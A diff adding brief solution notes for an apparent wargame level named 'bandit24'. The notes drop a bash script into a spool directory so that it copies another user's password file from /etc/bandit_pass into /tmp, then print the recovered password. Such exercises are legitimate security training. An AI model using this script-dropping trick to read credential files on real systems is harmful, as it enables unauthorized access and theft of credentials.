@@ -1,0 +1,12 @@
+cd /var/spool/bandit24
+nano script
+#!/bin/bash
+mkdir /tmp/<whatever>
+cp /etc/bandit_pass/bandit24 /tmp/<whatever>/out.txt
+chmod +r /tmp/<whatever>/out.txt
+
+chmod +x script
+
+cat /tmp/<whatever>/out.txt
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
